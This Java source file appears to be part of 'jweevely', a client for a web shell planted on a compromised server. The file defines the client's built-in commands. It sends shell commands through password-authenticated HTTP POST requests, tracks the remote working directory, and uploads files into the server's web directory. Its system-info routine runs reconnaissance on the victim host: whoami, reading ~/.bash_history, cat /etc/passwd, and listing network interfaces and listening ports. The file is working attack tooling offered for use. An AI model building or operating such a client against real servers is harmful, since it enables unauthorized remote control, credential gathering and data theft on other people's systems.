package jweevely;

import java.io.*;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.text.StringEscapeUtils;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.message.BasicNameValuePair;

/**
 * @author needle wang 2013年 12月 08日 星期日 22:56:07 CST
 */
public class BuiltIn {
  public final static String CURRENTFILE = ":current.file";
  public final static String DOCROOT = ":doc.root";
  public final static String FILE_UPLOAD_SMALL = ":file.upload.small";
  public final static String FILE_UPLOAD = ":file.upload";
  public final static String SYSTEM_INFO = ":system.info";
  public final static String ICONV = ":iconv";
  public final static String AT = ":at";
  public final static String PWD = ":pwd";
  public final static String HELP = ":help";
  public final static String[] BUILTIN_FUNCTION = new String[]{
      BuiltIn.CURRENTFILE, BuiltIn.DOCROOT, BuiltIn.FILE_UPLOAD,
      BuiltIn.FILE_UPLOAD_SMALL, BuiltIn.SYSTEM_INFO, BuiltIn.ICONV,
      BuiltIn.AT, BuiltIn.PWD, BuiltIn.HELP,};

  /**
   * it comes from server's response. do not use File Object, or the local OS
   * would parse path wrong. the local OS's file path is not always fit the
   * remote OS's.
   */
  public static String uriAbsolutePath;
  public static String doc_root;

  public BuiltIn(UserMesg aUser, String hostname, String cwd) {
    this.setaUser(aUser);
    this.setHostname(hostname);
    this.setCwd(cwd);
    this.origin_cwd = cwd;
    this.setLast_cwd(cwd);
    this.localOsName = System.getProperty("os.name");
  }

  /**
   * the field should be a instance, but I don't know how to make it be a
   * instance... maybe the struct is the problem. whatever, never mind.
   */
  public String getUriAbsolutePath() {
    return BuiltIn.uriAbsolutePath;
  }

  public String getDoc_Root() {
    return BuiltIn.doc_root;
  }

  public static void setUriAbsolutePath(String uriAbsolutePath) throws UnsupportedEncodingException {
    uriAbsolutePath = URLDecoder.decode(uriAbsolutePath, "UTF-8");
    uriAbsolutePath = UserMesg.decode_from_base64(uriAbsolutePath);

    int path_delimiter_index = uriAbsolutePath.indexOf("\0");

    // useful for linux client connect to windows.
    // must do this, the doUploadFile need /
    uriAbsolutePath = uriAbsolutePath.replaceAll("\\\\", "/");

    String uriAbsolutePath_tmp = uriAbsolutePath.substring(0,
        path_delimiter_index);

    BuiltIn.uriAbsolutePath = uriAbsolutePath_tmp;
    BuiltIn.doc_root = uriAbsolutePath.substring(path_delimiter_index + 1);
  }

  public UserMesg getaUser() {
    return aUser;
  }

  public void setaUser(UserMesg aUser) {
    this.aUser = aUser;
  }

  public String getRemoteOsName() {
    return remoteOsName;
  }

  public void setRemoteOsName(String remoteOsName) {
    this.remoteOsName = remoteOsName;
  }

  public String getLocalOsName() {
    return localOsName;
  }

  public String getLast_cwd() {
    return last_cwd;
  }

  public void setLast_cwd(String last_cwd) {
    if (!this.last_cwd.equals(last_cwd)) {
      this.last_cwd = last_cwd;
    }
  }

  public String getHostname() {
    return hostname;
  }

  public void setHostname(String hostname) {
    this.hostname = hostname;
  }

  public String getCwd() {
    // win系统中，在初始盘符下，从原始目录到其根目录(即初始盘符)不能用c:的方式cd, 要cd \或cd c:\
    if (cwd.equalsIgnoreCase(origin_cwd.substring(0, 2))) {
      cwd = cwd + "\\";
    }
    return cwd;
  }

  public void setCwd(String cwd) {
    // fuck windows, it's so hard to do with!
    // if (cwd.contains(" ") && !cwd.startsWith("\"")) {
    // cwd = "\"" + cwd + "\"";
    // }
    /*
     * if (cwd.contains("\\")) { cwd = cwd.replaceAll("\\\\", "/"); } //
     * god... It's not always right... if (cwd.contains(":/")) {
     * System.out.println("cwd is: "+cwd+"\n"+cwd.indexOf(":/")); cwd =
     * cwd.replaceFirst(":/", ":\\"); }
     */
    // 空格目录不需要双引号括起来，因为java能够自动处理好。
    this.cwd = cwd.trim();
  }

  /**
   * @param httppost HttpPost
   * @param inputStr String
   */
  public void doUploadFile(HttpPost httppost, String inputStr) {
    List<NameValuePair> nvps = new ArrayList<NameValuePair>();
    String mesg;
    try {
      String[] file_params = getUploadFile(inputStr);

      nvps.add(new BasicNameValuePair("f", file_params[0]));
      nvps.add(new BasicNameValuePair("c", file_params[1]));

      httppost.setEntity(new UrlEncodedFormEntity(nvps, "UTF-8"));

      String nop_cmd;

      // 2014年 05月 17日 星期六 04:00:24 CST
      // nop_cmd = ":;:;:;:;:;:;";
      if ("windows".equals(getRemoteOsName())) {
        nop_cmd = "::::::::::::::";
      } else {
        nop_cmd = "##############";
      }

      // not use exec, if put "", jsp treat the sess[1-3] not existing.
      mesg = JweevelyClient.oneJweevelyClient(aUser.getHttpclient(),
          httppost, aUser.getPassword(), nop_cmd,
          aUser.getPa_identify());
    } catch (IOException e) {
      mesg = e.getMessage();
    }

    // this mesg comes from server's writefile code area.
    System.out.println(mesg);
  }

  public static String usage() {
    return "jweevely v0.4 by needle wang.\n"
        + "2014年 05月 16日 星期五 06:36:02 CST\n\n"
        + "C/S both can be run in linux or windows.\n"
        + "use runtime.exec: support simple cd operation.\n"
        + "don't use some blocking commands, e.g. notepad.exe or sudo.\n"
        + "if the remote file's encoding not match remote OS's, \n"
        + "you can get the output, and iconv it.\n"
        + "1. shell command:\n" + "  cmd or bash's commands.\n"
        + "2. builtin commands:\n\t" + BuiltIn.CURRENTFILE + "\n\t"
        + BuiltIn.DOCROOT + "\n\t" + BuiltIn.PWD + "\n\t"
        + BuiltIn.FILE_UPLOAD
        + "\t\tlocalFilePath [-d remoteAbsolutePath]\t//text file\n\t"
        + BuiltIn.FILE_UPLOAD_SMALL + "\tlocalSmallFilePath\t\t\t"
        + "//text file and only for linux server\n\t"
        + BuiltIn.SYSTEM_INFO + "\n\t" + BuiltIn.ICONV + "\n\t"
        + ":at\n\t" + BuiltIn.HELP + "\n";
  }

  public static String aboutAT() {
    return "About at in linux:\n"
        + "jweevely doesn't support [nohup|jobs] in bg, but at or crontab is ok.\n"
        + "usage:\n" + "echo 'wget www.google.com' | at 1:23";
  }

  public static String gbk_to_clearText() {
    return "About iconv, usage:\n"
        + "method one:\n"
        + "  1.  echo \"the mess text\" | iconv -f UTF-8 -t gbk\n"
        + "  2.  cat the_file_contains_the_mess_test | iconv -f UTF-8 -t gbk\n"
        + "  3.  and so on. Linux is great!\n" + "alternative:\n"
        + "  1.  copy them into textfile with notepad.exe, save,\n"
        + "  and reopen it with whatever.\n" + "why is utf8 to gbk?\n"
        + "because println utf8 in java or Linux.";
  }

  /**
   * to fix chinese words' base64 depend to localOS even encode and decode.
   *
   * @param str String
   * @return String
   */
  public static String toUnicodePartly(String str) {
    StringBuffer sb = new StringBuffer();
    for (int i = 0; i < str.length(); i++) {

      if (str.charAt(i) < 256)// ASC11表中的字符码值不够4位,补00
      {
        sb.append(str.charAt(i));
      } else {
        String tmp = StringEscapeUtils.escapeJava(Character
            .toString(str.charAt(i)));
        sb.append(tmp);
      }
    }
    return sb.toString();
  }

  public static String unUnicodePartly(String text) {
    StringBuffer clear_text = new StringBuffer();

    Pattern pattern = Pattern.compile("\\\\u....");
    Matcher matcher = pattern.matcher(text);
    while (matcher.find()) {
      String oneMatch = matcher.group();
      String after_replace = unOneUnicode(oneMatch);
      // after_replace = StringEscapeUtils.unescapeJava(matcher.group());
      matcher.appendReplacement(clear_text, after_replace);
    }
    matcher.appendTail(clear_text);
    return clear_text.toString();
  }

  public static String unOneUnicode(String aWord) {
    return Character.toString((char) Integer.parseInt(
        aWord.substring("\\u".length()), 16));
  }

  /**
   * don't use, too huge...
   *
   * @param str String
   * @return String
   */
  public static String toUnicode(String str) {
    StringBuffer sb = new StringBuffer();
    for (int i = 0; i < str.length(); i++) {

      if (str.charAt(i) < 256)// ASC11表中的字符码值不够4位,补00
      {
        sb.append("\\u00");
      } else {
        sb.append("\\u");
      }
      // System.out.println(Integer.toHexString(s.charAt(i)));
      sb.append(Integer.toHexString(str.charAt(i)));
    }
    return sb.toString();
  }

  public static String unUnicode(String text) {
    StringBuilder gbk = new StringBuilder();
    String[] hex = text.split("\\\\u");
    for (int i = 1; i < hex.length; i++) { // 注意要从 1 开始，而不是从0开始。第一个是空。
      int data = Integer.parseInt(hex[i], 16); // 将16进制数转换为 10进制的数据。
      gbk.append((char) data); // 强制转换为char类型就是我们的中文字符了。
    }
    return gbk.toString();
  }

  public String validateIsBuiltIn(HttpPost httppost, String inputStr) {

    String builtInOutput = usingBuiltIn(httppost, inputStr);

    // If it's not empty, means using BuiltIn's command.
    if (!builtInOutput.isEmpty()) {

      if (builtInOutput.trim().startsWith(BuiltIn.SYSTEM_INFO)) {
        inputStr = builtInOutput.trim().substring(
            BuiltIn.SYSTEM_INFO.length());
      } else {
        // uploading small file need use exec
        if (builtInOutput.trim().startsWith(BuiltIn.FILE_UPLOAD_SMALL)) {
          inputStr = builtInOutput.trim().substring(
              BuiltIn.FILE_UPLOAD_SMALL.length());
        } else {

          // not use exec, so return null.
          // if not upload file and just show some mesg built in,
          // print it.
          if (!builtInOutput.trim().startsWith(BuiltIn.FILE_UPLOAD)) {
            System.out.println(builtInOutput);
          }
          return null;
        }
      }
    }
    // if not use BuiltIn's, return origin inpuStr.
    return inputStr;
  }

  public String usingBuiltIn(HttpPost httppost, String inputStr) {
    if (inputStr == null) {
      // impossible
      return "";
    }
    inputStr = inputStr.trim();

    if (inputStr.startsWith(BuiltIn.CURRENTFILE)) {
      return getUriAbsolutePath();
    }
    if (inputStr.startsWith(BuiltIn.DOCROOT)) {
      return getDoc_Root();
    }
    if (inputStr.startsWith(BuiltIn.FILE_UPLOAD_SMALL)) {
      try {
        if ("windows".equals(getRemoteOsName())) {
          throw new IOException("it not work on remote windows host.");
        }
        return uploadSmallFile(inputStr);
      } catch (IOException e) {
        return e.getMessage();
      }
    }
    if (inputStr.startsWith(BuiltIn.FILE_UPLOAD)) {
      doUploadFile(httppost, inputStr);
      return BuiltIn.FILE_UPLOAD;
    }
    if (BuiltIn.SYSTEM_INFO.equals(inputStr)) {
      return getSysteminfo();
    }
    if (BuiltIn.ICONV.equals(inputStr)) {
      return BuiltIn.gbk_to_clearText();
    }
    if (BuiltIn.PWD.equals(inputStr)) {
      return getCwd();
    }
    if (BuiltIn.AT.equals(inputStr)) {
      return aboutAT();
    }
    if (BuiltIn.HELP.equals(inputStr)) {
      return BuiltIn.usage();
    }
    if ("exit".equals(inputStr)) {
      System.exit(0);
    }
    // if not use BuiltIn command.
    return "";
  }

  public String validateIsCd(String inputStr) {
    inputStr = inputStr.trim();

    // jump to the root of partitions
    if ("windows".equals(getRemoteOsName())) {
      Pattern p = Pattern.compile("^[a-zA-Z]:$");
      Matcher m = p.matcher(inputStr);
      if (m.find()) {
        setLast_cwd(getCwd());
        setCwd(inputStr);
        return getCwd() + " && ";
      }
    }

    if (inputStr.trim().startsWith("cd")) {
      setCwd(doWithCwdPath(inputStr));
      inputStr = getCwd() + " && ";
    } else {
      inputStr = getCwd() + " && " + inputStr;
    }
    return inputStr;
  }

  /**
   * cd was fixed simply, but don't operate so strangely .
   */
  public String doWithCwdPath(String cmd) {
    if (cmd.startsWith("cd ") || cmd.equals("cd")) {

      if (cmd.trim().length() > 2) {
        String path = cmd.trim().substring(3).trim();

        if (path.equals("-")) {
          path = getLast_cwd();
        } else {
          if (path.equals("\\")) {
            path = getCwd().substring(0, 2);
          } else {
            Pattern p = Pattern.compile("^[a-zA-Z]:");
            Matcher m = p.matcher(path);
            if ((!path.startsWith("~")) && (!path.startsWith("/"))
                && !m.find()) {
              String cwd_tmp = getCwd();
              // even the path which contains space
              // don't need to be quoted.
              /*
               * if (cwd_tmp.startsWith("\"") &&
               * cwd_tmp.endsWith("\"")) { cwd_tmp = cwd_tmp
               * .substring(1, cwd_tmp.length() - 1); }
               */
              // 2014年 06月 23日 星期一 01:20:07 CST
              // 去掉多余的/或\\
              if (cwd_tmp.endsWith("/") || cwd_tmp.endsWith("\\")) {
                cwd_tmp = cwd_tmp.substring(0,
                    cwd_tmp.length() - 1);
              }
              if (getRemoteOsName().equals("windows")) {
                path = cwd_tmp + "\\" + path;
              } else {
                path = cwd_tmp + "/" + path;
              }
            }

          }
        }
        setLast_cwd(getCwd());
        return path;
      }
      // input cd to jump to origin_cwd
      return origin_cwd;
    }
    // impossible
    return "";
  }

  private String getSysteminfo() {
    StringBuffer strBuf = new StringBuffer();
    strBuf.append(BuiltIn.SYSTEM_INFO);

    if (this.getRemoteOsName().contains("linux")) {
      String[] infoList = new String[]{
          "echo -e \"current_user: $(whoami)\\n\"",
          "echo -e \"PATH=${PATH}\\n\"",
          "sort ~/.bash_history|uniq -c|sort -nr|head -n 12",
          "echo -e \"\\nonline_users:\n$(w)\\n\"", "cat /etc/issue",
          "cat /etc/motd", "uname -a",
          "echo -e \"\\nrelease:$(lsb_release -a)\\n\"", "cat /etc/passwd",
          "ip a", "ss -ntlp", "df -h"};
      for (String aList : infoList) {
        strBuf.append(aList).append(";");
      }
    } else {
      if (getRemoteOsName().contains("win")) {
        strBuf.append("systeminfo");
      }
    }
    return strBuf.toString();
  }

  /**
   * maybe abandon. it does not work in win.
   * if size is too big, client would deny...
   *
   * @param inputStr String
   * @return String
   * @throws IOException IOException
   */
  private String uploadSmallFile(String inputStr) throws IOException {
    inputStr = inputStr.substring(BuiltIn.FILE_UPLOAD_SMALL.length())
        .trim();

    File localFile = new File(inputStr.replace("~",
        System.getProperty("user.home")));

    BufferedReader br = new BufferedReader(new FileReader(localFile));
    StringBuffer strBuf = new StringBuffer();

    strBuf.append(BuiltIn.FILE_UPLOAD_SMALL);
    strBuf.append("echo '");

    String oneLine;
    while ((oneLine = br.readLine()) != null) {
      strBuf.append(oneLine).append("\n");
    }

    br.close();

    int path_index = getUriAbsolutePath().lastIndexOf("/");
    strBuf.append("' >")
        .append(getUriAbsolutePath().substring(0, path_index))
        .append("/").append(localFile.getName());

    return strBuf.toString();
  }

  /**
   * @param inputStr inputStr
   * @return return the file's name and content to upload.
   * @throws IOException IOException
   */
  private String[] getUploadFile(String inputStr) throws IOException {
    // destFile[0] is the destination file's name,
    // destFile[1] is the destination file's content.
    String[] destFile = new String[2];

    File localFile;
    String localFileStr;
    String destFileStr = null;

    inputStr = inputStr.substring(BuiltIn.FILE_UPLOAD.length()).trim();

    if (inputStr.contains("-d")) {
      localFileStr = inputStr.substring(0, inputStr.indexOf("-d")).trim();
      destFileStr = inputStr.substring(inputStr.indexOf("-d") + 2).trim();
    } else {
      localFileStr = inputStr;
    }

    localFile = new File(localFileStr.replace("~",
        System.getProperty("user.home")));

    BufferedReader br = new BufferedReader(new FileReader(localFile));
    StringBuffer strBuf = new StringBuffer();

    String oneLine;
    while ((oneLine = br.readLine()) != null) {
      strBuf.append(oneLine).append("\n");
    }

    br.close();

    // asign the destFile's path
    // if the destFileStr not given, use the uriAbsolutePath
    if (destFileStr != null) {
      destFile[0] = destFileStr;
      if (destFileStr.length() == 0) {
        System.out.println("write where?");
      }
    } else {
      int path_index = getUriAbsolutePath().lastIndexOf("/");
      destFile[0] = getUriAbsolutePath().substring(0, path_index) + "/"
          + localFile.getName();
    }
    destFile[1] = strBuf.toString();
    return destFile;
  }

  private final String origin_cwd;

  private UserMesg aUser;
  private String localOsName;
  private String remoteOsName;
  private String hostname = "";
  private String cwd = ".";

  // must initial! e.g. at the first time: cd -;:pwd
  private String last_cwd = "";

}
